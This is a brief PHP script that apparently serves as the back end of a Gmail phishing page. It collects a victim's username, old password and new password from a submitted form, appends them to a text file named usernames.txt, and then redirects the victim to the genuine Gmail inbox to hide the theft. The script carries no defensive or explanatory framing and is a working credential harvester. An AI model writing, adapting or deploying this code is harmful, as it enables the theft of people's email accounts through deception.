<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Old Password: " . $_POST['parola1'] . " New Password: " . $_POST['parola2'] . "\n", FILE_APPEND);
header('Location: https://mail.google.com/mail/u/0/#inbox');
exit();
?>
